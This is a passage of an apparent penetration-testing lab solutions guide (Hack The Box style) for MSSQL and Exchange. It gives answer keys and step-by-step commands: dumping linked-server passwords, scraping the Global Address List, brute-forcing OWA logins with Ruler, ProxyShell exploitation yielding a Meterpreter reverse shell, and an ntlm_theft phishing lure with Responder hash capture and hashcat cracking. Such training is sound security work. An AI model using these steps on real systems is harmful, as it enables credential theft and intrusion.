Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator> cd C:\Users\Administrator\Desktop
PS C:\Users\Administrator\Desktop> Import-Module .\Get-MSSQLLinkPasswords.psm1
```

Subsequently, students will utilize the imported module to obtain the password of `ws_user`:

Code: powershell

```powershell
Get-MSSQLLinkPasswords
```

```
PS C:\Users\Administrator\Desktop> Get-MSSQLLinkPasswords

Instance    Linkserver User    Password
--------    ---------- ----    --------
MSSQLSERVER SQL01      ws_user {hidden}
```

Answer: `yjwxm6b51N9nwiN8mCpB`

# Tools of the Trade

## Question 1

### "Run the Invoke-SQLAudit function against SQL01. What is the severity of the vulnerability which mentions 'xp\_fileexist'?"

After spawning the target, students will establish an RDP session using the credentials `student:FMTqQUwmDLFuWFpR55qD`:

Code: shell

```shell
xfreerdp /v:STMIP /u:student /p:FMTqQUwmDLFuWFpR55qD /dynamic-resolution
```

```
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-qahm8pntlk]─[~]
└──╼ [★]$ xfreerdp /v:10.129.229.240 /u:student /p:FMTqQUwmDLFuWFpR55qD /dynamic-resolution

[03:48:38:556] [7515:7516] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-8414/.config/freerdp
[03:48:38:556] [7515:7516] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-8414/.config/freerdp/certs]
[03:48:38:556] [7515:7516] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-8414/.config/freerdp/server]
[03:48:38:646] [7515:7516] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[03:48:38:646] [7515:7516] [WARN][com.freerdp.crypto] - CN = SQL01.htb.local
[03:48:38:647] [7515:7516] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[03:48:38:647] [7515:7516] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[03:48:38:647] [7515:7516] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[03:48:38:647] [7515:7516] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.229.240:3389) 
[03:48:38:647] [7515:7516] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[03:48:38:647] [7515:7516] [ERROR][com.freerdp.crypto] - Common Name (CN):
[03:48:38:647] [7515:7516] [ERROR][com.freerdp.crypto] - 	SQL01.htb.local
[03:48:38:647] [7515:7516] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.229.240:3389 (RDP-Server):
	Common Name: SQL01.htb.local
	Subject:     CN = SQL01.htb.local
	Issuer:      CN = SQL01.htb.local
	Thumbprint:  b7:2d:69:42:f4:73:bb:cc:00:52:69:99:c0:5d:b5:78:03:3c:4a:a4:a0:39:c0:d8:17:4e:9e:47:1a:fe:b1:99
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Subsequently, students will open `PowerShell`, navigate to `C:\Users\student\Desktop\PowerUpSQL`, and import the `PowerUpSQL.ps1` module:

Code: powershell

```powershell
cd C:\Users\student\Desktop\PowerUpSQL
Import-Module .\PowerUpSQL.ps1
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\student> cd C:\Users\student\Desktop\PowerUpSQL
PS C:\Users\student\Desktop\PowerUpSQL> Import-Module .\PowerUpSQL.ps1
```

Students will use the `Invoke-SQLAudit` function while providing the credentials `ws_dev:4X6cuvDLNer7nwYN5LBZ` and specifying `SQL01` as the instance, finding the severity level assigned to the `xp_fileexist` stored procedure:

Code: powershell

```powershell
Invoke-SQLAudit -Username "ws_dev" -Password "4X6cuvDLNer7nwYN5LBZ" -Instance "SQL01"
```

```
PS C:\Users\student\Desktop\PowerUpSQL> Invoke-SQLAudit -Username "ws_dev" -Password "4X6cuvDLNer7nwYN5LBZ" -Instance "SQL01"

VERBOSE: SQL01 : No named instance found.
VERBOSE: SQL01 : Connection Success.
VERBOSE: SQL01 : Checking for autoexec stored procedures...
<SNIP>
ComputerName  : SQL01
Instance      : SQL01
Vulnerability : Excessive Privilege - Execute xp_fileexist
Description   : xp_fileexist is a native extended stored procedure that can be executed by members of the Public role
                by default in SQL Server 2000-2014. Xp_dirtree can be used to force the SQL Server service account to
                authenticate to a remote attacker.  The service account password hash can then be captured + cracked
                or relayed to gain unauthorized access to systems. This also means xp_dirtree can be used to escalate
                a lower privileged user to sysadmin when a machine or managed account isnt being used.  Thats because
                the SQL Server service account is a member of the sysadmin role in SQL Server 2000-2014, by default.
Remediation   : Remove EXECUTE privileges on the xp_fileexist procedure for non administrative logins and roles.
                Example command: REVOKE EXECUTE ON xp_fileexist to Public
Severity      : {hidden}
IsVulnerable  : Yes
IsExploitable : Yes
<SNIP>
```

Answer: `Medium`

# Defensive Considerations

## Question 1

### "What is the specific version number of MSSQL Server installed on SQL01?"

After spawning the target, students will establish an RDP session using the credentials `student:FMTqQUwmDLFuWFpR55qD`:

Code: shell

```shell
xfreerdp /v:STMIP /u:student /p:FMTqQUwmDLFuWFpR55qD /dynamic-resolution
```

```
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-st3fp8nqa3]─[~]
└──╼ [★]$ xfreerdp /v:10.129.35.164 /u:student /p:FMTqQUwmDLFuWFpR55qD /dynamic-resolution

[05:00:50:119] [9034:9035] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-8414/.config/freerdp
[05:00:50:119] [9034:9035] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-8414/.config/freerdp/certs]
[05:00:50:120] [9034:9035] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-8414/.config/freerdp/server]
[05:00:50:173] [9034:9035] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[05:00:50:173] [9034:9035] [WARN][com.freerdp.crypto] - CN = SQL01.htb.local
[05:00:50:174] [9034:9035] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[05:00:50:174] [9034:9035] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[05:00:50:174] [9034:9035] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[05:00:50:174] [9034:9035] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.35.164:3389) 
[05:00:50:174] [9034:9035] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[05:00:50:174] [9034:9035] [ERROR][com.freerdp.crypto] - Common Name (CN):
[05:00:50:174] [9034:9035] [ERROR][com.freerdp.crypto] - 	SQL01.htb.local
[05:00:50:174] [9034:9035] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.35.164:3389 (RDP-Server):
	Common Name: SQL01.htb.local
	Subject:     CN = SQL01.htb.local
	Issuer:      CN = SQL01.htb.local
	Thumbprint:  b7:2d:69:42:f4:73:bb:cc:00:52:69:99:c0:5d:b5:78:03:3c:4a:a4:a0:39:c0:d8:17:4e:9e:47:1a:fe:b1:99
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

They will open `SQL Server Management Studio 20` (`SSMS`):

![[HTB Solutions/CAPE/z. images/fb9d778316bb48c33f561b1601d9eaa3_MD5.jpg]]

Subsequently, they will use the provided password (`4X6cuvDLNer7nwYN5LBZ`) in the `Introduction to MSSQL Server` section for `ws_dev` to connect to `SQL01`:

![[HTB Solutions/CAPE/z. images/c9050f9959bb4b1d83ee055fa5aca6b2_MD5.jpg]]

Students will execute a query to return the system information about the SQL server:

Code: sql

```sql
SELECT @@version;
```

![[HTB Solutions/CAPE/z. images/a63e048dbcdea709684c938bae2b0d90_MD5.jpg]]

Subsequently, students will find the specific version number of the MSSQL server in the results.

Answer: `16.0.1000.6`

# Defensive Considerations

## Question 2

### "Enumerate the features of SQL01. What is the maximum value of 'full-text language'?"

Students will reuse the previously established RDP and `SQL Server Management Studio` (`SSMS`) session. Subsequently, they will enable the `sp_configure` stored procedure to further enumerate the list of features, while impersonating the `sa` user:

Code: sql

```sql
EXECUTE AS LOGIN = 'sa';

EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

EXEC sp_configure;

EXEC sp_configure 'show advanced options', 0;
RECONFIGURE;
```

![[HTB Solutions/CAPE/z. images/3f70ff691461452b1b2753b9889a44f8_MD5.jpg]]

Students will attain the value for the answer on the 33rd row and the 3rd column.

Answer: `2147483647`

# Defensive Considerations

## Question 3

### "What port does MSSQL Server use to listen for TCP connections by default?"

![[HTB Solutions/CAPE/z. images/3e982d84041370683140eec8647d11e7_MD5.jpg]]

Answer: `1433`

# Introduction to Exchange

## Question 1

### "Perform an email search and identify what is the credential for the shared account g.dawson?"

After spawning the target students will open `Firefox`, navigate to `https://STMIP`, and log in using the credentials `INLANEFREIGHT\htb-student:HTB_@cademy_stdnt!`:

![[HTB Solutions/CAPE/z. images/71e54fe8854af79d0d9bee868cb5c3a9_MD5.jpg]]

Subsequently, they will utilize the search functionality in `Outlook Web Application` using `g.dawson` as the keyword. Students will stumble upon a single email that holds information about the shared account details of `g.dawson` including the password.

![[HTB Solutions/CAPE/z. images/1240833820af8fee0fb342cbadd932d2_MD5.jpg]]

Answer: `c}71ub#4Fqq^`

# Introduction to Exchange

## Question 2

### "Search emails and find a database link. Use the database link as the answer."

Students will reuse the previously spawned target and access to `Outlook Web Application`. They will use the search functionality to look for the keyword `database`. Students will stumble upon a single email that contains information about an Oracle database, including the database URL, which they will submit as an answer.

![[HTB Solutions/CAPE/z. images/c1ae075094475ba09d16f033d202ae71_MD5.jpg]]

Answer: `https://oracle-db.inlanefreight.com`

# Introduction to Exchange

## Question 3

### "What's the email address of the IT Support member that shared the credentials?"

Students will reuse the previously spawned target and access to `Outlook Web Application`. They will click on either of the two previous emails and search to bring up the profile and contact information for the user `Monroe Novak`, finding the email associated with that account in the `Send email` variable.

![[HTB Solutions/CAPE/z. images/d8a1ca4abf72a532961f84530161205e_MD5.jpg]]

Answer: `m.novak@inlanefreight.local`

# Enumeration

## Question 1

### "How many emails were you able to export from the Global Address List?"

After spawning the target, students will proceed to clone the [global-address-list-owa](https://github.com/pigeonburger/global-address-list-owa) GitHub repository:

Code: shell

```shell
git clone https://github.com/pigeonburger/global-address-list-owa
cd global-address-list-owa/
```

```
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-yrenou3vyo]─[~]
└──╼ [★]$ git clone https://github.com/pigeonburger/global-address-list-owa

Cloning into 'global-address-list-owa'...
remote: Enumerating objects: 24, done.
remote: Counting objects: 100% (24/24), done.
remote: Compressing objects: 100% (23/23), done.
remote: Total 24 (delta 5), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (24/24), 7.62 KiB | 7.62 MiB/s, done.
Resolving deltas: 100% (5/5), done.
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-yrenou3vyo]─[~]
└──╼ [★]$ cd global-address-list-owa/
```

Subsequently, students will modify the Python script to allow for self-signed certificates by adding `verify=False` on lines `35`, `38`, `50`, and `63`, as shown in the section.

The final version of the Python script should look like the following:

Code: python

```python
# Extraction of the Global Address List (GAL) on Exchange >=2013 servers via Outlook Web Access (OWA) 
# By Pigeonburger, June 2021
# https://github.com/pigeonburger

# module import heehoo
import requests, json, argparse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# argparser hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh
parser = argparse.ArgumentParser(description="Extract the Global Address List (GAL) on Exchange 2013 servers via Outlook Web Access (OWA)")
parser.add_argument("-i", "--host", dest="hostname",
                  help="Hostname for the Exchange Server", metavar="HOSTNAME", type=str, required=True)
parser.add_argument("-u", "--username", dest="username",
                  help="A username to log in", metavar="USERNAME", type=str, required=True)
parser.add_argument("-p", "--password", dest="password",
                  help="A password to log in", metavar="PASSWORD", type=str, required=True)
parser.add_argument("-o", "--output-file", dest="output",
                  help="Specify file to output emails to (default is global_address_list.txt)", metavar="OUTPUT FILE", type=str, default="global_address_list.txt")

args = parser.parse_args()

url = args.hostname
USERNAME = args.username
PASSWORD = args.password
OUTPUT = args.output

# Start the session
s = requests.Session()
print("Connecting to %s/owa" % url)

# Get OWA landing page
# Add https:// scheme if not already added in the --host arg
try:
    s.get(url+"/owa", verify=False)
    URL = url
except requests.exceptions.MissingSchema:
    s.get("https://"+url+"/owa", verify=False)
    URL = "https://"+url

# Other URLs we need later
AUTH_URL = URL+"/owa/auth.owa"
PEOPLE_FILTERS_URL = URL + "/owa/service.svc?action=GetPeopleFilters"
FIND_PEOPLE_URL = URL + "/owa/service.svc?action=FindPeople"

# Attempt a login to OWA
login_data={"username":USERNAME, "password":PASSWORD, 'destination': URL, 'flags': '4', 'forcedownlevel': '0'}
r = s.post(AUTH_URL, data=login_data, headers={'user-agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"}, verify=False)

# The Canary is a unique ID thing provided upon a successful login that's also required in the header for the next few requests to be successful.
# Even upon an incorrect login, OWA still gives a 200 status, so we can also check if the login was successful by seeing if this cookie was set or not.
try:
    session_canary = s.cookies['X-OWA-CANARY']
except:
    exit("\nInvalid Login Details. Login Failed.")
print("\nLogin Successful!\nCanary key:", session_canary)

# Returns an object containing the IDs of all accessible address lists, so we can specify one in the FindPeople request
r = s.post(PEOPLE_FILTERS_URL, headers={'Content-type': 'application/json', 'X-OWA-CANARY': session_canary, 'Action': 'GetPeopleFilters'}, data={}, verify=False).json()

# Find the Global Address List id
for i in r:
    if i['DisplayName'] == "Default Global Address List":
        AddressListId = i['FolderId']['Id']
        print("Global List Address ID:", AddressListId)
        break

# Set to None to return all emails in the list (this is the search term for the FindPeople request)
query = None

# Set the max results for the FindPeople request.
max_results = 99999

# POST data for the FindPeople request
peopledata = {
    "__type": "FindPeopleJsonRequest:#Exchange",
    "Header": {
        "__type": "JsonRequestHeaders:#Exchange",
        "RequestServerVersion": "Exchange2013",
        "TimeZoneContext": {
            "__type": "TimeZoneContext:#Exchange",
            "TimeZoneDefinition": {
                "__type": "TimeZoneDefinitionType:#Exchange",
                "Id": "AUS Eastern Standard Time"
            }
        }
    },
    "Body": {
        "__type": "FindPeopleRequest:#Exchange",
        "IndexedPageItemView": {
            "__type": "IndexedPageView:#Exchange",
            "BasePoint": "Beginning",
            "Offset": 0,
            "MaxEntriesReturned": max_results
        },
        "QueryString": query,
        "ParentFolderId": {
            "__type": "TargetFolderId:#Exchange",
            "BaseFolderId": {
                "__type": "AddressListId:#Exchange",
                "Id": AddressListId
            }
        },
        "PersonaShape": {
            "__type": "PersonaResponseShape:#Exchange",
            "BaseShape": "Default"
        },
        "ShouldResolveOneOffEmailAddress": False
    }
}

# Make da request.
r = s.post(FIND_PEOPLE_URL, headers={'Content-type': 'application/json', 'X-OWA-CANARY': session_canary, 'Action': 'FindPeople'}, data=json.dumps(peopledata), verify=False).json()

# Parse out the emails, print them and append them to a file.
userlist = r['Body']['ResultSet']

with open(OUTPUT, 'a+') as outputfile:
    for user in userlist:
        email = user['EmailAddresses'][0]['EmailAddress']
        outputfile.write(email+"\n")
        print(email)

print("\nFetched %s emails" % str(len(userlist)))
print("Emails written to", OUTPUT)
```

Students will proceed to add an entry in their `/etc/hosts` file:

Code: shell

```shell
sudo sh -c 'echo "STMIP exch01.inlanefreight.local" >> /etc/hosts'
```

```
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-yrenou3vyo]─[~/global-address-list-owa]
└──╼ [★]$ sudo sh -c 'echo "10.129.224.86 exch01.inlanefreight.local" >> /etc/hosts'
```

Students will use the Python script to get a list of emails in the organization, finding out the number of emails:

Code: shell

```shell
python3 emailextract.py -i exch01.inlanefreight.local -u htb-student@inlanefreight.local -p 'HTB_@cademy_stdnt!'
```

```
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-yrenou3vyo]─[~/global-address-list-owa]
└──╼ [★]$ python3 emailextract.py -i exch01.inlanefreight.local -u htb-student@inlanefreight.local -p 'HTB_@cademy_stdnt!'

Connecting to exch01.inlanefreight.local/owa

Login Successful!
Canary key: PAj9-sW4sU286QEifkaGrJBrq7HRwdwIT4a8vTEYyjg1BsJ-FFWDOXKEDolFo0IG6G13h3QjxUY.
Global List Address ID: e145c509-4761-4507-a92b-e5f76a19daea
Administrator@inlanefreight.local
AllCompany@inlanefreight.local
a.barber@inlanefreight.local
a.gross@inlanefreight.local
d.smitt@inlanefreight.local
e.quinn@inlanefreight.local
g.dawson@inlanefreight.local
htb-student@inlanefreight.local
j.hull@inlanefreight.local
m.novak@inlanefreight.local
o.hodge@inlanefreight.local
r.olsen@inlanefreight.local
t.solis@inlanefreight.local
w.moss@inlanefreight.local

Fetched {hidden} emails
Emails written to global_address_list.txt
```

Answer: `14`

# Enumeration

## Question 2

### "Submit the version of Exchange"

Students will reuse the previously spawned target and will perform a cURL request to the `ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application` endpoint, where they will find the version in use:

Code: shell

```shell
curl https://exch01.inlanefreight.local/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application -k | xmllint --format - | grep version
```

```
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-yrenou3vyo]─[~/global-address-list-owa]
└──╼ [★]$ curl https://exch01.inlanefreight.local/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application -k | xmllint --format - | grep version

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 15856  100 15856    0     0  12036      0  0:00:01  0:00:01 --:--:-- 12030
<?xml version="1.0" encoding="utf-8"?>
  <assemblyIdentity xmlns="urn:schemas-microsoft-com:asm.v1" name="microsoft.exchange.ediscovery.exporttool.application" version="{hidden}" publicKeyToken="1f16bd4ec4c2bb19" language="neutral" processorArchitecture="msil"/>
      <assemblyIdentity name="microsoft.exchange.ediscovery.exporttool" version="{hidden}" publicKeyToken="1f16bd4ec4c2bb19" language="neutral" processorArchitecture="msil" type="win32"/>
              <as:assemblyIdentity xmlns="urn:schemas-microsoft-com:asm.v1" name="microsoft.exchange.ediscovery.exporttool.application" version="{hidden}" publicKeyToken="1f16bd4ec4c2bb19" language="neutral" processorArchitecture="msil"/>
```

Answer: `15.2.721.2`

# Enumeration

## Question 3

### "Find valid credentials and submit the email"

Students will utilize the previously created `global_address_list.txt` list containing the email address and will create a password list based on the company name and the year, e.g., `Inlanefreight2022!`:

Code: shell

```shell
cat << EOF > passwords.txt
Inlanefreight2022!
Inlanefreight2023!
Inlanefreight2024!
Inlanefreight2025!
EOF
```

```
┌─[us-academy-6]─[10.10.14.76]─[htb-ac-8414@htb-imlohn09px]─[~/global-address-list-owa]
└──╼ [★]$ cat << EOF > passwords.txt
Inlanefreight2022!
Inlanefreight2023!
Inlanefreight2024!
Inlanefreight2025!
EOF
```

Subsequently, students will download `Ruler` from the [releases](https://github.com/sensepost/ruler/releases/tag/2.4.1):

Code: shell

```shell
wget -q https://github.com/sensepost/ruler/releases/download/2.4.1/ruler-linux64
chmod +x ruler-linux64
```

```
┌─[us-academy-6]─[10.10.14.76]─[htb-ac-8414@htb-imlohn09px]─[~/global-address-list-owa]
└──╼ [★]$ wget -q https://github.com/sensepost/ruler/releases/download/2.4.1/ruler-linux64
chmod +x ruler-linux64
```

They will perform a brute-force attack using the wordlists containing emails and potential passwords using `ruler-linux64`, and obtain the email address of the user who has a weak password:

Code: shell

```shell
./ruler-linux64 --domain exch01.inlanefreight.local --insecure brute --users global_address_list.txt --passwords passwords.txt
```

```
┌─[us-academy-6]─[10.10.14.76]─[htb-ac-8414@htb-imlohn09px]─[~/global-address-list-owa]
└──╼ [★]$ ./ruler-linux64 --domain exch01.inlanefreight.local --insecure brute --users global_address_list.txt --passwords passwords.txt 

[+] Starting bruteforce
[+] Trying to Autodiscover domain
[+] 0 of 4 passwords checked
[+] Success: {hidden}:Inlanefreight2024!
```

Answer: `j.hull@inlanefreight.local`

# Enumeration

## Question 4

### "Using the previously obtained credentials, enumerate and submit the flag"

Students will navigate to `https://exch01.inlanefreight.local` and will use the credentials found in the previous question to access the mailbox. They will find the flag in the email titled `Flag`:

![[HTB Solutions/CAPE/z. images/631a99393620050208c8f37f7a493464_MD5.jpg]]

Answer: `HTB{7o_Be_0r_n077_pwn3d}`

# Vulnerabilities

## Question 1

### "Exploit the target and submit the contents of the flag.txt located at C:\\Users\\Administrator.INLANEFREIGHT\\Desktop"

After spawning the target, students will use `Metasploit` and the `ProxyShell` exploit to verify if the target is vulnerable:

Code: shell

```shell
metasploit -q
use exploit/windows/http/exchange_proxyshell_rce
set RHOSTS STMIP
set LHOST tun0
check
```

```
┌─[us-academy-6]─[10.10.14.76]─[htb-ac-8414@htb-w8m7u05xw2]─[~]
└──╼ [★]$ msfconsole -q

[msf](Jobs:0 Agents:0) >> use exploit/windows/http/exchange_proxyshell_rce
[*] Using configured payload windows/x64/meterpreter/reverse_tcp

[msf](Jobs:0 Agents:0) exploit(windows/http/exchange_proxyshell_rce) >> set RHOSTS 10.129.153.30

RHOSTS => 10.129.153.30
[msf](Jobs:0 Agents:0) exploit(windows/http/exchange_proxyshell_rce) >> set LHOST tun0

LHOST => 10.10.14.76
[msf](Jobs:0 Agents:0) exploit(windows/http/exchange_proxyshell_rce) >> check
[+] 10.129.153.30:443 - The target is vulnerable.
```

Once students have confirmed that the target is vulnerable, they will run the exploit and get a shell.

Code: shell

```shell
run
```

```
[msf](Jobs:0 Agents:0) exploit(windows/http/exchange_proxyshell_rce) >> run

[*] Started reverse TCP handler on 10.10.14.76:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Attempt to exploit for CVE-2021-34473

<SNIP>

[*] Removing the mailbox export request
[*] Removing the draft email

(Meterpreter 1)(c:\windows\system32\inetsrv) > 
```

Subsequently, students can grab the flag located in `C:\Users\Administrator.INLANEFREIGHT\Desktop`:

Code: shell

```shell
shell
type C:\Users\Administrator.INLANEFREIGHT\Desktop\flag.txt
```

```
(Meterpreter 1)(c:\windows\system32\inetsrv) > shell
Process 8004 created.
Channel 2 created.
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>type C:\Users\Administrator.INLANEFREIGHT\Desktop\flag.txt
```

Answer: `HTB{Whoop$iee_5gda3ws}`

# Phishing Attacks

## Question 1

### "Perform a phishing attack against r.olsen@inlanefreight.local and crack her password. Submit the password as the answer."

After spawning the target, students will proceed to clone [ntlm\_theft](https://github.com/Greenwolf/ntlm_theft):

Code: shell

```shell
git clone -q https://github.com/Greenwolf/ntlm_theft
cd ntlm_theft/
```

```
┌─[us-academy-6]─[10.10.14.76]─[htb-ac-8414@htb-xgmydlt504]─[~]
└──╼ [★]$ git clone -q https://github.com/Greenwolf/ntlm_theft
cd ntlm_theft/
```

Right after, students will create a malicious `htm` file, which is going to point to their workstations:

Code: shell

```shell
python3 ntlm_theft.py -g htm -s PWNIP -f academy
```

```
┌─[us-academy-6]─[10.10.14.76]─[htb-ac-8414@htb-xgmydlt504]─[~/ntlm_theft]
└──╼ [★]$ python3 ntlm_theft.py -g htm -s 10.10.14.76 -f academy

Created: academy/academy.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Generation Complete.
```

Subsequently, they will navigate to the `Outlook Web Application`, log in using the credentials `INLANEFREIGHT\htb-student:HTB_@cademy_stdnt!`, and create a new email.

![[HTB Solutions/CAPE/z. images/ecc09ad7a8b48b1393752eea5e6b029b_MD5.jpg]]

Students will specify `r.olsen@inlanefreight.local` as the recipient, choose a random subject, and add vague text to the email. Additionally, students will attach the `htm` file previously created in the email and send it.

![[HTB Solutions/CAPE/z. images/161d0bc55c2b120e2163f7c4cc245540_MD5.jpg]]

Subsequently, students will start `responder` and will wait for an authentication.

Code: shell

```shell
sudo responder -I tun0
```

```
┌─[us-academy-6]─[10.10.14.76]─[htb-ac-8414@htb-xgmydlt504]─[~/ntlm_theft]
└──╼ [★]$ sudo responder -I tun0

                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

<SNIP>

[+] Listening for events...

[!] Error starting TCP server on port 80, check permissions or other servers running.
```

After a few moments, students will notice that the authentication request of `r.olsen` was captured:

```
<SNIP>
[!] Error starting TCP server on port 80, check permissions or other servers running.
[SMB] NTLMv2-SSP Client   : 10.129.231.81
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\r.olsen
[SMB] NTLMv2-SSP Hash     : r.olsen::INLANEFREIGHT:1a636f807fb14937:5193DB0738FD746779348A9291613BC9:0101000000000000004F71D444F4DA01FD8EC2CF02DC18A40000000002000800420055004D004C0001001E00570049004E002D004E00350059005A003000570042004D004C003200360004003400570049004E002D004E00350059005A003000570042004D004C00320036002E00420055004D004C002E004C004F00430041004C0003001400420055004D004C002E004C004F00430041004C0005001400420055004D004C002E004C004F00430041004C0007000800004F71D444F4DA01060004000200000008003000300000000000000001000000002000003AA0213623EEAE4C5ED9F27D23BE706C358E0CE5D828B1A791E42BC93119F2E60A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00370036000000000000000000
<SNIP>
```

Students will terminate `Responder`, and will use `hashcat` in mode `5600` to crack the NetNTLMv2 hash using `rockyou` as a dictionary file:

Code: shell

```shell
hashcat -m 5600 'r.olsen::INLANEFREIGHT:1a636f807fb14937:5193DB0738FD746779348A9291613BC9:0101000000000000004F71D444F4DA01FD8EC2CF02DC18A40000000002000800420055004D004C0001001E00570049004E002D004E00350059005A003000570042004D004C003200360004003400570049004E002D004E00350059005A003000570042004D004C00320036002E00420055004D004C002E004C004F00430041004C0003001400420055004D004C002E004C004F00430041004C0005001400420055004D004C002E004C004F00430041004C0007000800004F71D444F4DA01060004000200000008003000300000000000000001000000002000003AA0213623EEAE4C5ED9F27D23BE706C358E0CE5D828B1A791E42BC93119F2E60A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00370036000000000000000000' /usr/share/wordlists/rockyou.txt.gz
```

```
┌─[us-academy-6]─[10.10.14.76]─[htb-ac-8414@htb-xgmydlt504]─[~/ntlm_theft]
└──╼ [★]$ hashcat -m 5600 'r.olsen::INLANEFREIGHT:1a636f807fb14937:5193DB0738FD746779348A9291613BC9:0101000000000000004F71D444F4DA01FD8EC2CF02DC18A40000000002000800420055004D004C0001001E00570049004E002D004E00350059005A003000570042004D004C003200360004003400570049004E002D004E00350059005A003000570042004D004C00320036002E00420055004D004C002E004C004F00430041004C0003001400420055004D004C002E004C004F00430041004C0005001400420055004D004C002E004C004F00430041004C0007000800004F71D444F4DA01060004000200000008003000300000000000000001000000002000003AA0213623EEAE4C5ED9F27D23BE706C358E0CE5D828B1A791E42BC93119F2E60A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00370036000000000000000000' /usr/share/wordlists/rockyou.txt.gz
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-haswell-AMD EPYC 7542 32-Core Processor, skipped

<SNIP>

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt.gz
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs

R.OLSEN::INLANEFREIGHT:1a636f807fb14937:5193db0738fd746779348a9291613bc9:0101000000000000004f71d444f4da01fd8ec2cf02dc18a40000000002000800420055004d004c0001001e00570049004e002d004e00350059005a003000570042004d004c003200360004003400570049004e002d004e00350059005a003000570042004d004c00320036002e00420055004d004c002e004c004f00430041004c0003001400420055004d004c002e004c004f00430041004c0005001400420055004d004c002e004c004f00430041004c0007000800004f71d444f4da01060004000200000008003000300000000000000001000000002000003aa0213623eeae4c5ed9f27d23be706c358e0ce5d828b1a791e42bc93119f2e60a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00370036000000000000000000:{hidden}

<SNIP>
```

Students will proceed to reuse `hashcat` to show the cracked password, which they will submit as an answer:

Code: shell

```shell
